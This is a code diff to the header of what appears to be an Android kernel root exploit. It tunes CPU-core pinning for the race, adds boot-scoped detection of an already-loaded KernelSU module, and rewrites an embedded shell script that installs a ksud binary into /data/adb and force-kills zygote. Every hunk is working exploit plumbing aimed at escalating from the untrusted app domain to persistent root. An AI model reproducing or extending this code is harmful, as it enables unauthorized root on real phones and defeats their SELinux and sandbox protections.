@@ -40,6 +40,7 @@
 #include <unistd.h>
 
 #include "kernelsnitch/utils.h"
+#include "affinity.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
@@ -74,7 +75,9 @@
 #define KERNELSNITCH_MTE_ENABLED 0
 #endif
 #define MM_PARTIALS 5
-#define CORE 0
+/* Time-sensitive choreography core: Cortex-X3 prime on SM8550-class SoCs
+ * (auto-detected; was cpu0 = LITTLE before topology-aware pinning). */
+#define CORE affinity_timing_core()
 #ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
 #endif
@@ -143,7 +146,10 @@
 #define P0_DATA_ALIAS_CONST(image_addr) \
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
-#define CONSUMER_CORE (CORE + 1)
+#define CONSUMER_CORE affinity_consumer_core()
+#ifndef SLIDE_WAITER_CORE
+#define SLIDE_WAITER_CORE affinity_waiter_core()
+#endif
 #define CONSUMER_MAX_CALLS 1
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
@@ -569,11 +575,65 @@ static inline int read_boot_id(char *out, size_t out_len) {
   return got > 0;
 }
 
+/*
+ * Boot-scoped KernelSU-active marker on public external storage. The
+ * shell-context stability keeper writes it as soon as /proc/modules shows
+ * the module; every later payload invocation reads it back and compares the
+ * embedded boot_id. This exists because /proc/modules itself can be
+ * unreadable from the untrusted_app domain on some policies, which used to
+ * let an app-domain auto-root retry re-run the exploit after a zygote
+ * restart even though root was already live.
+ */
+static inline int ksu_sd_marker_valid(void) {
+  char boot_id[64];
+  if (!read_boot_id(boot_id, sizeof(boot_id))) {
+    return 0;
+  }
+  char path[160];
+  snprintf(path, sizeof(path), "/storage/emulated/0/.cve43499-ksu-%s",
+           boot_id);
+  return access(path, R_OK) == 0;
+}
+
+static inline void ksu_sd_marker_write(void) {
+  char boot_id[64];
+  if (!read_boot_id(boot_id, sizeof(boot_id))) {
+    return;
+  }
+  char path[160];
+  snprintf(path, sizeof(path), "/storage/emulated/0/.cve43499-ksu-%s",
+           boot_id);
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+  if (fd < 0) {
+    return;
+  }
+  ssize_t ignored = write(fd, boot_id, strlen(boot_id));
+  (void)ignored;
+  close(fd);
+}
+
+/* Sysfs mirror of a loaded "kernelsu" module: /sys/module/kernelsu exists
+ * whenever the module is registered with the kernel and the directory is
+ * traversable from contexts where /proc/modules readback is denied. */
+static inline int ksu_sysfs_present(void) {
+  struct stat st;
+  return stat("/sys/module/kernelsu", &st) == 0 && S_ISDIR(st.st_mode);
+}
+
 static inline int ksu_active_this_boot(void) {
   /* /proc/modules reflects the live kernel state and is readable from
-   * every domain, so it supersedes the old boot_id marker comparison
-   * (the marker could not be persisted from the daemon context). */
-  return ksu_module_loaded();
+   * most domains, so it supersedes the old boot_id marker comparison
+   * (the marker could not be persisted from the daemon context). The two
+   * extra signals below keep the detector honest from restricted app
+   * domains: sysfs mirrors module registration, and the public-storage
+   * marker is written by the shell-context keeper right after late-load. */
+  if (ksu_module_loaded()) {
+    return 1;
+  }
+  if (ksu_sysfs_present()) {
+    return 1;
+  }
+  return ksu_sd_marker_valid();
 }
 
 static inline void ksu_mark_active_this_boot(void) {
@@ -635,14 +695,42 @@ static inline int modules_done_this_boot(void) {
   if (up < 0) {
     return 1;
   }
+  /* Preferred format: the marker stores the sysinfo uptime captured at
+   * write time. Uptime is monotonic within a boot and resets on reboot,
+   * so a stored value <= live uptime proves same-boot completion without
+   * touching the wall clock — NTP corrections minutes into a boot used to
+   * make the pure-mtime check look stale and re-trigger zygote kills. */
+  int fd = open(KSU_MODULES_DONE_PATH, O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    char buf[32];
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n > 0) {
+      buf[n] = '\0';
+      long stored = strtol(buf, NULL, 10);
+      if (stored > 0) {
+        return stored <= up + 2;
+      }
+    }
+  }
+  /* Legacy "done" payload: fall back to the mtime heuristic. */
   return st.st_mtime >= time(NULL) - up - 5;
 }
 
 static inline void mark_modules_done(void) {
+  char payload[32];
+  long up = ksu_uptime_sec();
+  size_t len;
+  if (up >= 0) {
+    len = (size_t)snprintf(payload, sizeof(payload), "%ld", up);
+  } else {
+    memcpy(payload, "done", 5);
+    len = 4;
+  }
   int fd = open(KSU_MODULES_DONE_PATH,
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
   if (fd >= 0) {
-    ssize_t ignored = write(fd, "done", 4);
+    ssize_t ignored = write(fd, payload, len);
     (void)ignored;
     close(fd);
   }
@@ -685,27 +773,42 @@ static inline void activation_lock_release(int fd) {
  * daemon itself lives in u:r:kernel:s0, which SELinux denies /data/adb
  * access, ksud execution and zygote signaling. Exits non-zero unless all
  * three lifecycle stages succeeded.
+ *
+ * Boot-safety contract: this script is retried by long-lived actors, so it
+ * must never disturb a running framework unless module activation actually
+ * succeeded. Exit 42 defers while the system is still booting; stage
+ * failures leave the zygote untouched so retries cannot soft-reboot-loop.
  */
 #define KSU_APPLY_SCRIPT \
+  "if [ \"$(getprop sys.boot_completed 2>/dev/null)\" != \"1\" ]; then " \
+  "echo 'apply-modules: boot not completed; deferring' >&2; exit 42; fi; " \
   "ksud=''; " \
-  "for p in /data/adb/ksud /data/adb/ksu/bin/ksud " \
-  "/data/local/tmp/ksud-s25u-kdp; do " \
+  "for p in /data/local/tmp/ksud-s25u-kdp /data/adb/ksud " \
+  "/data/adb/ksu/bin/ksud; do " \
   "[ -x \"$p\" ] && ksud=\"$p\" && break; " \
   "done; " \
   "if [ -z \"$ksud\" ]; then " \
   "echo 'apply-modules: no ksud binary found' >&2; exit 1; " \
   "fi; " \
+  "if [ \"$ksud\" != \"/data/adb/ksud\" ]; then " \
+  "cp \"$ksud\" /data/adb/ksud 2>/dev/null && chmod 755 /data/adb/ksud; fi; " \
   "rc=0; " \
   "for s in post-fs-data services boot-completed; do " \
   "\"$ksud\" \"$s\" >/dev/null 2>&1 || rc=1; " \
   "echo \"apply-modules: ksud $s exit=$? ($ksud)\"; " \
   "done; " \
+  "if [ \"$rc\" != \"0\" ]; then " \
+  "echo 'apply-modules: ksud stages failed; leaving zygote alone' >&2; " \
+  "exit $rc; fi; " \
+  "if [ -d /data/adb/modules/zygisk_vector ] && [ -z \"$(pidof vectord)\" ]; " \
+  "then \"$ksud\" services >/dev/null 2>&1; sleep 2; fi; " \
+  "echo \"apply-modules: vectord pid=$(pidof vectord)\"; " \
   "killed=0; " \
   "for p in $(pidof zygote64) $(pidof zygote); do " \
   "kill -9 $p 2>/dev/null && killed=1; " \
   "done; " \
   "if [ \"$killed\" = 0 ]; then echo 'apply-modules: no zygote killed' >&2; " \
-  "rc=1; fi; " \
-  "exit $rc"
+  "exit 1; fi; " \
+  "echo 'apply-modules: zygote restarted for module pickup'; exit 0"
 
 #endif
